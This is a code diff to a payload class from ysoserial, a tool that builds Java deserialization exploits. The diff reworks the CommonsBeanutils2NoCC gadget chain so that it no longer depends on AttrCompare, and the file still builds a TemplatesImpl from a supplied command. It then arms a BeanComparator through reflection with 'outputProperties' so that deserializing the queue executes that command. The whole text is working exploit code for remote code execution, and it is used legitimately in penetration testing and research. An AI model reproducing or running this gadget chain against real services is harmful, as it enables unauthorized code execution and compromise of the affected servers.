@@ -1,6 +1,5 @@
 package ysoserial.payloads;
 
-import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
 import org.apache.commons.beanutils.BeanComparator;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
@@ -19,13 +18,13 @@ public class CommonsBeanutils2NoCC implements ObjectPayload<Object> {
 	public Object getObject(final String command) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
 		// mock method name until armed
-		final BeanComparator comparator = new BeanComparator("lowestSetBit", new AttrCompare());
+		final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
 
 		// create queue with numbers and basic comparator
 		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
 		// stub data for replacement later
-		queue.add(new BigInteger("1"));
-		queue.add(new BigInteger("1"));
+		queue.add("1");
+		queue.add("1");
 
 		// switch method called by comparator
 		Reflections.setFieldValue(comparator, "property", "outputProperties");
